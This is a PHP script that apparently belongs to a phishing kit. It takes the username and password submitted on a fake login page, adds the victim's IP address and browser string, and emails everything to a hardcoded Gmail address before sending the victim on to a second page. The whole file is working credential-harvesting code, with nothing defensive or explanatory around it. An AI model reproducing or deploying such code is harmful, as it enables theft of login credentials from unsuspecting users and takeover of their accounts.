<?php
$zabi = getenv("REMOTE_ADDR");
$email = "godfirst4me2003@gmail.com";
$message .= "us : ".$_POST['xx']."\n";
$message .= "pd : ".$_POST['yy']."\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$login = $_POST['xx'];
$passwd = $_POST['yy'];
$subject = "CP MAIN1";
$headers = "From: CP MAIN1 <wfsdrcryry242032>\r\n";
if (empty($login) || empty($passwd)) {
header( "Location: index.html#$login" );
}
else {
mail($email,$subject,$message,$headers);
header("Location: index2.html#$login");
}
?>